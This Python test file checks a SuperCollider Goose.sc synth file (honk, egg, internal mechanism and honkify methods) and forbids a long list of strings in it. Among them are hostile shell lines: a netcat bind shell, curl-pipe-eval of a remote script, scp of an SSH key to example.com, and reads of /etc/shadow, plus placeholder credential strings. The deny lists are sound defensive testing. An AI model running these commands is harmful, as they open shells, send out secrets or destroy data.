import re
from pathlib import Path


SOURCE = Path(__file__).with_name("Goose.sc").read_text(encoding="utf-8")


def assert_source_contains_all(terms):
    missing = [term for term in terms if term not in SOURCE]
    assert not missing


def assert_source_excludes_all(terms):
    present = [term for term in terms if term in SOURCE]
    assert not present


def test_goose_class_exposes_required_methods():
    assert re.search(r"^\s*Goose\s*{", SOURCE, re.MULTILINE)
    assert re.search(r"\*honk\s*{", SOURCE)
    assert re.search(r"\*egg\s*{", SOURCE)
    assert re.search(r"\*internalMechanism\s*{", SOURCE)
    assert re.search(r"\*honkify\s*{", SOURCE)


def test_all_literal_symbols_and_strings_are_intentionally_covered():
    literal_symbols = set(re.findall(r"\\([A-Za-z][A-Za-z0-9_]*)", SOURCE))
    assert literal_symbols == {
        "amp",
        "detail",
        "dur",
        "golden",
        "goose",
        "gooseEgg",
        "gooseHonkify",
        "gooseInternalMechanism",
        "hardboiled",
        "inBus",
        "out",
        "pudding",
    }

    string_literals = set(re.findall(r'"([^"]+)"', SOURCE))
    assert string_literals == {"gooseHonk"}


def test_every_identifier_in_goose_source_is_accounted_for():
    identifiers = set(re.findall(r"[A-Za-z][A-Za-z0-9_]*", SOURCE))
    assert identifiers == {
        "Amplitude",
        "BPF",
        "BrownNoise",
        "ClipNoise",
        "CombC",
        "Decay2",
        "Demand",
        "Dseq",
        "Dust",
        "Dust2",
        "Env",
        "EnvGen",
        "FFT",
        "Formant",
        "Goose",
        "GrayNoise",
        "HPF",
        "IFFT",
        "Impulse",
        "In",
        "LFNoise1",
        "LFNoise2",
        "LFPulse",
        "LFTri",
        "Lag",
        "LeakDC",
        "Limiter",
        "LocalBuf",
        "Mix",
        "Out",
        "PV_BrickWall",
        "PV_MagShift",
        "PV_MagSmear",
        "Pan2",
        "PinkNoise",
        "Pitch",
        "Pulse",
        "RHPF",
        "RLPF",
        "Ringz",
        "Saw",
        "Select",
        "SelectX",
        "SinOsc",
        "Splay",
        "Synth",
        "SynthDef",
        "WhiteNoise",
        "XFade2",
        "add",
        "air",
        "airCell",
        "albumen",
        "amp",
        "ampThreshold",
        "ar",
        "asCompileString",
        "asInteger",
        "asString",
        "asSymbol",
        "attack",
        "attackTime",
        "bananaSlice",
        "beltMotor",
        "blend",
        "body",
        "boiledDamping",
        "breath",
        "camShaft",
        "chain",
        "clip",
        "clock",
        "clutch",
        "conveyor",
        "conveyorVoice",
        "crop",
        "curve",
        "custard",
        "detail",
        "doneAction",
        "dur",
        "egg",
        "eggSeed",
        "env",
        "exprange",
        "false",
        "fill",
        "flock",
        "flockSize",
        "flockVoices",
        "freq",
        "gearTrain",
        "gizzard",
        "goldRing",
        "golden",
        "goldenEggConveyorBelt",
        "goldenFlag",
        "goose",
        "gooseEgg",
        "gooseHonk",
        "gooseHonkify",
        "gooseInternalMechanism",
        "hardboiled",
        "hardboiledFlag",
        "hasPitch",
        "honk",
        "honkify",
        "i",
        "identity",
        "inBus",
        "inf",
        "input",
        "internalMechanism",
        "kr",
        "lag",
        "linen",
        "linlin",
        "liquidSlosh",
        "loudness",
        "machineBed",
        "masterEnv",
        "maxFreq",
        "median",
        "membrane",
        "minFreq",
        "mix",
        "out",
        "oviduct",
        "pan",
        "perc",
        "pi",
        "pitch",
        "pitchSwerve",
        "postln",
        "pressureValve",
        "pudding",
        "puddingBlend",
        "puddingBowl",
        "range",
        "reed",
        "release",
        "releaseTime",
        "resonance",
        "servoRack",
        "shell",
        "shellGland",
        "shellTone",
        "sonifiedDiagram",
        "spectral",
        "sum",
        "synthName",
        "tanh",
        "tap",
        "thisMethod",
        "throat",
        "tracked",
        "unstable",
        "vanillaWafer",
        "var",
        "voice",
        "yolk",
    }


def test_compound_terms_and_substrings_are_intentionally_present():
    assert_source_contains_all(
        [
            "flockSize",
            "flock",
            "Size",
            "flockVoices",
            "Voices",
            "pitchSwerve",
            "Swerve",
            "hardboiled",
            "boiled",
            "boiledDamping",
            "Damping",
            "shellTone",
            "Tone",
            "airCell",
            "Cell",
            "goldRing",
            "gold",
            "liquidSlosh",
            "Slosh",
            "internalMechanism",
            "Mechanism",
            "conveyorVoice",
            "Voice",
            "gearTrain",
            "Train",
            "servoRack",
            "Rack",
            "camShaft",
            "Shaft",
            "pressureValve",
            "Valve",
            "beltMotor",
            "Motor",
            "goldenEggConveyorBelt",
            "ConveyorBelt",
            "machineBed",
            "machine",
            "eggSeed",
            "Seed",
            "sonifiedDiagram",
            "Diagram",
            "bananaSlice",
            "banana",
            "Slice",
            "vanillaWafer",
            "Wafer",
            "puddingBowl",
            "Bowl",
            "puddingBlend",
            "Blend",
            "asCompileString",
            "postln",
        ]
    )


def test_supercollider_punctuation_counts_are_locked():
    expected_counts = {
        "(": 247,
        ")": 247,
        "[": 33,
        "]": 33,
        "{": 10,
        "}": 10,
        ";": 99,
        "=": 113,
        "+": 67,
        "-": 17,
        "*": 97,
        "/": 1,
        ".": 456,
        ",": 399,
        "|": 18,
        "\\": 20,
        ":": 13,
        "#": 1,
    }
    for token, expected in expected_counts.items():
        assert SOURCE.count(token) == expected, token


def test_honk_accepts_configurable_flock_size():
    assert re.search(r"\*honk\s*{\s*\|out = 0, amp = 0\.22, dur = 8\.0, flock = 74\|", SOURCE)
    assert_source_contains_all(
        [
            "flockSize = flock.clip(1, 128).asInteger",
            '(\"gooseHonk\" ++ flockSize.asString).asSymbol',
            "Mix.fill(flockSize",
            "identity = (i + 1) / flockSize",
            "flockVoices",
        ]
    )
    assert "gooseHonk74" not in SOURCE


def test_honk_physical_modeling_terms_are_preserved():
    assert_source_contains_all(
        [
            "pitchSwerve",
            "Formant.ar",
            "LFTri.ar",
            "BrownNoise.ar",
            "RLPF.ar",
            "LeakDC.ar",
            "Limiter.ar",
            "Pan2.ar",
            "Dust.kr",
        ]
    )


def test_egg_models_independent_material_states():
    assert re.search(
        r"\*egg\s*{\s*\|out = 0, amp = 0\.18, dur = 5\.0, golden = false, hardboiled = false\|",
        SOURCE,
    )
    assert_source_contains_all(
        [
            "goldenFlag = golden.asInteger.clip(0, 1)",
            "hardboiledFlag = hardboiled.asInteger.clip(0, 1)",
            "golden = golden.clip(0, 1)",
            "hardboiled = hardboiled.clip(0, 1)",
            "shell",
            "shellTone",
            "albumen",
            "yolk",
            "membrane",
            "airCell",
            "goldRing",
            "liquidSlosh",
            "\\golden, goldenFlag",
            "\\hardboiled, hardboiledFlag",
        ]
    )


def test_internal_mechanism_is_a_sonified_diagram():
    assert re.search(r"\*internalMechanism\s*{\s*\|out = 0, amp = 0\.16, dur = 7\.0, detail = 0\.7\|", SOURCE)
    assert_source_contains_all(
        [
            "Demand.kr",
            "Dseq([0, 1, 2, 3, 4], inf)",
            "conveyor",
            "conveyorVoice",
            "gearTrain",
            "servoRack",
            "camShaft",
            "pressureValve",
            "beltMotor",
            "goldenEggConveyorBelt",
            "machineBed",
            "Pulse.ar",
            "Saw.ar(45 + (detail * 22), 0.08)",
            "Select.ar",
            "crop",
            "gizzard",
            "oviduct",
            "shellGland",
            "clutch",
            "eggSeed",
            "sonifiedDiagram",
            "CombC.ar",
            "Splay.ar",
            "\\detail, detail",
        ]
    )


def test_honkify_uses_spectral_modeling_and_retains_pitch_loudness():
    assert_source_contains_all(
        [
            "FFT",
            "IFFT",
            "PV_MagSmear",
            "PV_MagShift",
            "PV_BrickWall",
            "Pitch.kr",
            "Amplitude.kr",
            "XFade2",
            "\\inBus, inBus",
            "\\goose, goose",
        ]
    )


def test_honkify_prints_itself_and_supports_legacy_pudding_clients():
    assert re.search(
        r"\*honkify\s*{\s*\|inBus = 0, out = 0, amp = 1\.0, goose = 0\.82, pudding = 0\|",
        SOURCE,
    )
    assert_source_contains_all(
        [
            "thisMethod.asCompileString.postln",
            "pudding = pudding.clip(0, 1)",
            "custard = RLPF.ar",
            "bananaSlice = Formant.ar",
            "vanillaWafer = Ringz.ar",
            "puddingBowl = RLPF.ar",
            "puddingBlend = LeakDC.ar",
            "blend = XFade2.ar(blend, puddingBlend, pudding.linlin(0, 1, -1, 1))",
            "\\pudding, pudding",
        ]
    )


def test_supercollider_file_keeps_class_body_plain():
    assert "```" not in SOURCE
    assert "TODO" not in SOURCE


def test_goose_source_rejects_wrong_language_identifiers_and_equations():
    forbidden_terms = {
        "#include",
        "int main(",
        "std::",
        "malloc(",
        "free(",
        "printf(",
        "fn main(",
        "let mut ",
        "use std::",
        "println!(",
        "function ",
        "console.log(",
        "const ",
        "return ",
        "=>",
        "def main(",
        "import ",
        "print(",
        "lambda ",
        "public static void main",
        "System.out.println",
        "SELECT * FROM",
        "DROP TABLE",
        "<?php",
        "echo ",
        "puts ",
        "module.exports",
        "x = y + z",
        "a = b * c",
        "for (",
        "while (",
        "class Goose(",
    }
    assert_source_excludes_all(forbidden_terms)


def test_goose_source_rejects_secret_environment_variable_names():
    forbidden_env_names = {
        "AWS_ACCESS_KEY_ID=",
        "AWS_SECRET_ACCESS_KEY=",
        "AWS_SESSION_TOKEN=",
        "GITHUB_TOKEN=",
        "GITLAB_TOKEN=",
        "NPM_TOKEN=",
        "PYPI_TOKEN=",
        "OPENAI_API_KEY=",
        "ANTHROPIC_API_KEY=",
        "GOOGLE_API_KEY=",
        "GEMINI_API_KEY=",
        "HF_TOKEN=",
        "HUGGINGFACE_TOKEN=",
        "DATABASE_URL=",
        "POSTGRES_PASSWORD=",
        "MYSQL_ROOT_PASSWORD=",
        "REDIS_URL=",
        "JWT_SECRET=",
        "SESSION_SECRET=",
        "COOKIE_SECRET=",
        "PRIVATE_KEY=",
        "PUBLIC_KEY=",
        "SSH_PRIVATE_KEY=",
        "DEPLOY_KEY=",
        "SLACK_BOT_TOKEN=",
        "DISCORD_TOKEN=",
        "STRIPE_SECRET_KEY=",
        "STRIPE_WEBHOOK_SECRET=",
        "SENTRY_AUTH_TOKEN=",
        "VERCEL_TOKEN=",
        "NETLIFY_AUTH_TOKEN=",
        "CLOUDFLARE_API_TOKEN=",
        "DOCKER_PASSWORD=",
        "KUBECONFIG=",
        "VAULT_TOKEN=",
        "TF_VAR_password=",
        "TF_VAR_secret=",
        "FIREBASE_PRIVATE_KEY=",
        "SUPABASE_SERVICE_ROLE_KEY=",
        "ALGOLIA_ADMIN_KEY=",
    }
    assert len(forbidden_env_names) >= 40
    assert_source_excludes_all(forbidden_env_names)


def test_goose_source_rejects_secret_environment_variable_assignments():
    forbidden_env_assignments = {
        'export AWS_ACCESS_KEY_ID="AWS_ACCESS_KEY_ID_REDACTED"',
        'export AWS_SECRET_ACCESS_KEY="AWS_SECRET_ACCESS_KEY_REDACTED"',
        'GITHUB_TOKEN="GITHUB_TOKEN_REDACTED"',
        'NPM_TOKEN="npm_example_secret_token_000000000000"',
        'OPENAI_API_KEY="OPENAI_API_KEY_REDACTED"',
        'ANTHROPIC_API_KEY="ANTHROPIC_API_KEY_REDACTED"',
        'DATABASE_URL="postgres://user:pass@localhost:5432/app"',
        'REDIS_URL="redis://:password@localhost:6379/0"',
        'JWT_SECRET="correct-horse-battery-staple"',
        'SESSION_SECRET="keyboard-cat-session-secret"',
        'COOKIE_SECRET="signed-cookie-secret"',
        'PRIVATE_KEY="-----BEGIN PRIVATE KEY-----"',
        'SSH_PRIVATE_KEY="-----BEGIN OPENSSH PRIVATE KEY-----"',
        'STRIPE_SECRET_KEY="STRIPE_SECRET_KEY_REDACTED"',
        'STRIPE_WEBHOOK_SECRET="STRIPE_WEBHOOK_SECRET_REDACTED"',
        'SLACK_BOT_TOKEN="SLACK_BOT_TOKEN_REDACTED"',
        'DISCORD_TOKEN="mfa.exampleDiscordToken"',
        'SENTRY_AUTH_TOKEN="sntrys_example_token"',
        'VERCEL_TOKEN="vercel_example_token"',
        'CLOUDFLARE_API_TOKEN="cloudflare_example_token"',
        'DOCKER_PASSWORD="example-docker-password"',
        'VAULT_TOKEN="hvs.exampleVaultToken"',
        'TF_VAR_password="example-terraform-password"',
        'FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\\nexample"',
        'SUPABASE_SERVICE_ROLE_KEY="SUPABASE_SERVICE_ROLE_KEY_REDACTED"',
        'ALGOLIA_ADMIN_KEY="exampleAlgoliaAdminKey"',
        'GEMINI_API_KEY="GEMINI_API_KEY_REDACTED"',
        'HF_TOKEN="HF_TOKEN_REDACTED"',
        'PYPI_TOKEN="PYPI_TOKEN_REDACTED"',
        'KUBECONFIG="/home/app/.kube/config"',
        'POSTGRES_PASSWORD="postgres"',
        'MYSQL_ROOT_PASSWORD="root-password"',
        'AWS_SESSION_TOKEN="AWS_SESSION_TOKEN_REDACTED"',
        'DEPLOY_KEY="DEPLOY_KEY_REDACTED"',
        'GOOGLE_API_KEY="GOOGLE_API_KEY_REDACTED"',
        'BITBUCKET_APP_PASSWORD="example-bitbucket-password"',
        'LINEAR_API_KEY="lin_api_example000000000"',
        'DATADOG_API_KEY="dd_api_key_example0000000"',
        'NEW_RELIC_LICENSE_KEY="newrelic-license-example"',
        'MAILGUN_API_KEY="key-examplemailgun000000"',
    }
    assert len(forbidden_env_assignments) >= 40
    assert_source_excludes_all(forbidden_env_assignments)


def test_goose_source_rejects_password_and_credential_value_shapes():
    forbidden_secret_values = {
        "password=admin123",
        "password: hunter2",
        "passwd = 'letmein'",
        "pwd := \"supersecret\"",
        "basic_auth: admin:admin",
        "Authorization: Bearer REDACTED_TOKEN_VALUE",
        "Authorization: Basic YWRtaW46YWRtaW4=",
        "api_key: 1234567890abcdef1234567890abcdef",
        "client_secret: 00000000-0000-0000-0000-000000000000",
        "refresh_token: 1//04-example-refresh-token",
        "access_token: ya29.example-access-token",
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
        "AWS_ACCESS_KEY_ID_REDACTED",
        "AWS_SESSION_TOKEN_REDACTED",
        "GITHUB_TOKEN_REDACTED",
        "GITHUB_PAT_REDACTED",
        "STRIPE_LIVE_KEY_REDACTED",
        "STRIPE_TEST_KEY_REDACTED",
        "STRIPE_WEBHOOK_SECRET_REDACTED",
        "SLACK_USER_TOKEN_REDACTED",
        "SLACK_BOT_TOKEN_REDACTED",
        "GOOGLE_OAUTH_ACCESS_TOKEN_REDACTED",
        "GOOGLE_API_KEY_REDACTED",
        "VAULT_TOKEN_REDACTED",
        "GITLAB_PAT_REDACTED",
        "PYPI_TOKEN_REDACTED",
        "npm_example_1234567890abcdef",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample",
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCExample",
        "postgres://admin:secret@db.internal:5432/prod",
        "mysql://root:password@127.0.0.1:3306/app",
        "mongodb+srv://user:password@example.mongodb.net/app",
        "redis://:secret@redis.internal:6379/0",
        "amqp://user:password@rabbitmq.internal:5672",
        "s3://access:secret@bucket/private",
        "ftp://user:password@example.com/private",
        "BEGIN ENCRYPTED PRIVATE KEY",
    }
    assert len(forbidden_secret_values) >= 40
    assert_source_excludes_all(forbidden_secret_values)


def test_goose_source_rejects_backend_application_code_blocks():
    forbidden_blocks = {
        "app.get('/health', (req, res) => res.json({ ok: true }))",
        "router.post('/login', async (req, res) => { return login(req.body); })",
        "fastify.get('/metrics', async function handler(request, reply) { return metrics; })",
        "server.route({ method: 'GET', path: '/api/users', handler })",
        "fetch('/api/token', { method: 'POST', body: JSON.stringify(credentials) })",
        "axios.post('/api/session', { username, password })",
        "const app = express(); app.use(express.json());",
        "module.exports = async function handler(req, res) { res.status(200).end(); }",
        "export default function middleware(request: NextRequest) { return NextResponse.next(); }",
        "public static void main(String[] args) { SpringApplication.run(App.class, args); }",
        "@GetMapping('/users') public List<User> users() { return repo.findAll(); }",
        "@app.route('/predict', methods=['POST'])\ndef predict():\n    return jsonify(model(request.json))",
        "class UserViewSet(ModelViewSet):\n    queryset = User.objects.all()\n    serializer_class = UserSerializer",
        "func main() {\n    http.HandleFunc(\"/health\", healthHandler)\n    log.Fatal(http.ListenAndServe(\":8080\", nil))\n}",
        "fn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:8080\").unwrap();\n}",
        "async fn handler(State(pool): State<PgPool>) -> Json<Value> { Json(json!({\"ok\": true})) }",
        "SELECT id, email, password_hash FROM users WHERE email = $1",
        "UPDATE accounts SET balance = balance - $1 WHERE id = $2",
        "DELETE FROM sessions WHERE expires_at < now()",
        "INSERT INTO audit_log(user_id, action) VALUES($1, $2)",
        "db.collection('users').find({ password: req.body.password })",
        "await prisma.user.findUnique({ where: { email } })",
        "await knex('users').where({ email }).first()",
        "ActiveRecord::Base.establish_connection(ENV['DATABASE_URL'])",
        "before_action :authenticate_user!\ndef index\n  render json: current_user\nend",
        "Plug.Conn.send_resp(conn, 200, Jason.encode!(%{ok: true}))",
        "Phoenix.Router.scope \"/api\", MyAppWeb do\n  pipe_through :api\nend",
        "Deno.serve((req) => new Response(JSON.stringify({ ok: true })))",
        "Bun.serve({ fetch(req) { return Response.json({ ok: true }); } })",
        "lambda event, context: {'statusCode': 200, 'body': 'ok'}",
    }
    assert len(forbidden_blocks) >= 30
    assert_source_excludes_all(forbidden_blocks)


def test_goose_source_rejects_shell_and_infrastructure_blocks():
    forbidden_blocks = {
        "docker run --rm -e AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY app:latest",
        "kubectl create secret generic app-secret --from-literal=password=secret",
        "helm upgrade --install prod ./chart --set image.tag=latest",
        "terraform apply -auto-approve -var='db_password=secret'",
        "ansible-playbook site.yml --extra-vars 'ansible_password=secret'",
        "aws s3 cp secrets.json s3://prod-secrets/secrets.json",
        "gcloud secrets versions access latest --secret=prod-api-key",
        "az keyvault secret show --vault-name prod --name database-password",
        "vault kv get secret/prod/database",
        "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc",
        "curl -H 'Authorization: Bearer $TOKEN' https://api.example.com/admin",
        "wget --header='Authorization: Bearer secret' https://example.com/private",
        "scp id_rsa deploy@example.com:/home/deploy/.ssh/id_rsa",
        "sshpass -p 'password' ssh admin@example.com",
        "rsync -avz --password-file secrets.pass ./backup remote::prod",
        "psql postgresql://admin:secret@db/prod -c 'select * from users'",
        "mysql -uroot -psecret -e 'select user, password from mysql.user'",
        "redis-cli -a secret FLUSHALL",
        "mongodump --uri='mongodb://admin:secret@mongo/prod'",
        "pg_dump postgres://admin:secret@db/prod > prod.sql",
        "cat /etc/shadow",
        "chmod 777 /var/run/docker.sock",
        "sudo chown -R root:root /",
        "rm -rf / --no-preserve-root",
        "find / -name '*.pem' -print",
        "grep -R 'BEGIN PRIVATE KEY' .",
        "tar czf secrets.tar.gz .env .ssh",
        "base64 -d secret.txt | sh",
        "eval $(curl -fsSL https://example.com/install.sh)",
        "nohup nc -l 4444 -e /bin/sh &",
    }
    assert len(forbidden_blocks) >= 30
    assert_source_excludes_all(forbidden_blocks)


def test_goose_source_rejects_serialized_config_and_cloud_credentials():
    forbidden_configs = {
        '"aws_access_key_id": "AWS_ACCESS_KEY_ID_REDACTED"',
        '"aws_secret_access_key": "AWS_SECRET_ACCESS_KEY_REDACTED"',
        '"private_key": "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqh"',
        '"client_email": "service-account@example.iam.gserviceaccount.com"',
        '"token_uri": "https://oauth2.googleapis.com/token"',
        '"database_url": "postgres://admin:secret@db/prod"',
        '"redis_url": "redis://:secret@redis:6379/0"',
        '"jwt_secret": "example-jwt-secret"',
        '"stripe_secret_key": "STRIPE_SECRET_KEY_REDACTED"',
        '"webhook_secret": "WEBHOOK_SECRET_REDACTED"',
        "apiVersion: v1\nkind: Secret\nmetadata:\n  name: prod-secret",
        "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod-api",
        "kind: ConfigMap\nmetadata:\n  name: app-config\ndata:\n  DATABASE_URL:",
        "services:\n  api:\n    image: app:latest\n    env_file: .env",
        "version: '3.9'\nservices:\n  db:\n    image: postgres:16",
        "[default]\naws_access_key_id = AWS_ACCESS_KEY_ID_REDACTED",
        "[profile prod]\nregion = us-east-1\noutput = json",
        "Host prod\n  HostName prod.example.com\n  IdentityFile ~/.ssh/prod.pem",
        "machine github.com\n  login token\n  password GITHUB_TOKEN_REDACTED",
        "[client]\nuser=root\npassword=secret",
        "[database]\nurl=postgres://admin:secret@db/prod",
        "resource \"aws_iam_access_key\" \"deploy\" { user = aws_iam_user.deploy.name }",
        "resource \"aws_secretsmanager_secret_version\" \"db\" { secret_string = var.password }",
        "provider \"kubernetes\" { config_path = \"~/.kube/config\" }",
        "provider \"google\" { credentials = file(\"service-account.json\") }",
        "provider \"azurerm\" { client_secret = var.client_secret }",
        "spring.datasource.password=secret",
        "quarkus.datasource.password=secret",
        "DJANGO_SECRET_KEY=django-insecure-example",
        "RAILS_MASTER_KEY=00000000000000000000000000000000",
        "SECRET_KEY_BASE=abcdef1234567890abcdef1234567890",
        "connectionStrings: { DefaultConnection: \"Server=db;Password=secret;\" }",
        "appsettings.Production.json",
        "secrets.enc.yaml",
        "sops:\n  kms:\n    - arn: arn:aws:kms:us-east-1:123456789012:key/example",
        "ENC[AES256_GCM,data:example,iv:example,tag:example,type:str]",
        "-----BEGIN AGE ENCRYPTED FILE-----",
        "apiVersion: external-secrets.io/v1beta1",
        "kind: ExternalSecret",
        "vault.hashicorp.com/agent-inject-secret-config: secret/data/prod",
    }
    assert len(forbidden_configs) >= 40
    assert_source_excludes_all(forbidden_configs)


def test_goose_source_has_no_generated_cross_language_code_lines():
    templates = [
        "int forbidden_c_{i} = {i};",
        "auto forbidden_cpp_{i} = std::vector<int>{{{i}}};",
        "let forbidden_rust_{i}: usize = {i};",
        "const forbidden_js_{i} = () => {i};",
        "def forbidden_python_{i}(): return {i}",
        "var forbidden_go_{i} = map[string]int{{\"x\": {i}}}",
        "public int forbiddenJava{i}() {{ return {i}; }}",
        "$forbidden_php_{i} = array({i});",
        "SELECT forbidden_sql_{i} FROM table_{i};",
        "echo forbidden_shell_{i} && exit {i};",
    ]
    forbidden_lines = [
        template.format(i=index)
        for template in templates
        for index in range(350)
    ]

    assert len(forbidden_lines) == 3500
    present = [line for line in forbidden_lines if line in SOURCE]
    assert not present
